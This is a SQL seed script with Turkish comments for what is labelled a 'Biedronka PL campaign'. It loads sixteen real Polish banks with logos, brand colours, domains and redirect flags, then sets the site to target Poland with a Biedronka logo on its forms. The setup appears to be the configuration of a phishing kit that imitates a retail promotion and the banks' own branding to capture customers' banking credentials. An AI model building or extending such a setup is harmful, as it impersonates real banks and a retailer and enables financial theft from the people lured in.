-- =========================================================================
-- BIEDRONKA PL KAMPANYASI — bankalar seed (Polonya)
-- Yeni Supabase projesinde calistirilir. 16 Polonya bankasi aktif gelir.
-- =========================================================================

create table if not exists public.banks (
  slug          text primary key,
  name          text not null,
  country       text,
  logo_file     text,
  brand_color   text,
  accent_color  text,
  domain        text,
  is_active     boolean default true,
  auto_redirect boolean default false,
  sort_order    integer default 0,
  design_config jsonb default '{}'::jsonb
);

alter table public.banks enable row level security;
drop policy if exists "banks_authenticated_all" on public.banks;
drop policy if exists "banks_anon_select"       on public.banks;
create policy "banks_authenticated_all" on public.banks for all to authenticated using (true) with check (true);
create policy "banks_anon_select"       on public.banks for select to anon using (true);

insert into public.banks (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, auto_redirect, sort_order, design_config) values
  ('pekao24',    'Bank Pekao (PeoPay)',       'Polonya', '/bank-logos/poland/pekao24.webp',   '#e31e24', '#b3181d', 'pekao24.pl',       true, false, 10,  '{}'),
  ('ing',        'ING Bank Śląski',           'Polonya', '/bank-logos/poland/ing.webp',       '#ff6200', '#cc4e00', 'ing.pl',           true, false, 20,  '{}'),
  ('bnpparibas', 'BNP Paribas',               'Polonya', '/bank-logos/poland/bnpparibas.webp','#008766', '#006850', 'bnpparibas.pl',    true, false, 30,  '{}'),
  ('millennium', 'Bank Millennium',           'Polonya', '/bank-logos/poland/millennium.webp','#e2004f', '#b3003f', 'bankmillennium.pl',true, false, 40,  '{}'),
  ('alior',      'Alior Bank',                'Polonya', '/bank-logos/poland/alior.webp',     '#e10064', '#b30050', 'aliorbank.pl',     true, false, 50,  '{}'),
  ('velobank',   'VeloBank',                  'Polonya', '/bank-logos/poland/velobank.webp',  '#00a650', '#008040', 'velobank.pl',      true, false, 60,  '{}'),
  ('santander',  'Santander',                 'Polonya', '/bank-logos/poland/santander.svg', '#ec0000', '#bd0000', 'santander.pl',     true, false, 70,  '{}'),
  ('mbank',      'mBank',                     'Polonya', '/bank-logos/poland/mbank.webp',     '#d9222a', '#b01b22', 'mbank.pl',         true, false, 80,  '{}'),
  ('ipko',       'iPKO (PKO BP)',             'Polonya', '/bank-logos/poland/ipko.webp',      '#0051ba', '#003e94', 'ipko.pl',          true, false, 90,  '{}'),
  ('ca24',       'Crédit Agricole (CA24)',    'Polonya', '/bank-logos/poland/ca24.webp',      '#006f4e', '#00583e', 'ca24.pl',          true, false, 100, '{}'),
  ('citibank',   'Citi Handlowy',             'Polonya', '/bank-logos/poland/citibank.svg',  '#056dae', '#04578b', 'citibank.pl',      true, false, 110, '{}'),
  ('pocztowy',   'Bank Pocztowy',             'Polonya', '/bank-logos/poland/pocztowy.webp',  '#ffc000', '#cc9a00', 'pocztowy.pl',      true, false, 120, '{}'),
  ('sgb',        'Bank Spółdzielczy (SGB)',   'Polonya', '/bank-logos/poland/sgb.webp',       '#008a44', '#006e36', 'sgb.pl',           true, false, 130, '{}'),
  ('bps',        'Bank BPS',                  'Polonya', '/bank-logos/poland/bps.webp',       '#0054a6', '#004385', 'bps.pl',           true, false, 140, '{}'),
  ('bosbank',    'BOŚ Bank',                  'Polonya', '/bank-logos/poland/bosbank.webp',   '#009a44', '#007b36', 'bosbank.pl',       true, false, 150, '{}'),
  ('bsr-krakow', 'BS Rzeszów / Kraków',       'Polonya', '/bank-logos/poland/bsr-krakow.svg','#1a5ea6', '#154b85', 'bsr.pl',           true, false, 160, '{}')
on conflict (slug) do update set
  name          = excluded.name,
  country       = excluded.country,
  logo_file     = excluded.logo_file,
  brand_color   = excluded.brand_color,
  accent_color  = excluded.accent_color,
  domain        = excluded.domain,
  is_active     = excluded.is_active,
  auto_redirect = excluded.auto_redirect,
  sort_order    = excluded.sort_order;

-- =========================================================================
-- global_settings: Polonya hedefi + Lehce dil
-- (site_language='pl' -> languageDefaults.pl metinleri otomatik kullanilir)
-- =========================================================================
update public.global_settings
set site_language  = 'pl',
    target_country = 'Polonya',
    logo_url       = '/form-assets/biedronka-mini-logo.webp'
where id = 'default';
